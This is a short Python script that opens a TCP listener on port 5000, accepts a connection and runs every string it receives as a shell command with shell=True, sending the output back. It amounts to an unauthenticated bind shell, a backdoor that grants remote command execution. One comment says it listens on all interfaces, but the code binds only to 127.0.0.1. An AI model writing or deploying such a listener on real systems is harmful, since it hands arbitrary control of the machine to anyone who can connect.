import socket
import subprocess


def main():
    host = '127.0.0.1'  # Listen on all interfaces
    port = 5000  # Port to listen on

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"[*] Listening on {host}:{port}")

    conn, addr = server_socket.accept()
    print(f"[+] Connection from {addr}")

    while True:
        # Receive command from client
        command = conn.recv(1024).decode()
        if command.lower() == 'exit':
            print("[*] Exiting...")
            break

        print(f"[*] Executing command: {command}")
        try:
            # Execute command and capture output
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output

        # Send back the output to the client
        conn.send(output)

    conn.close()
    server_socket.close()


if __name__ == "__main__":
    main()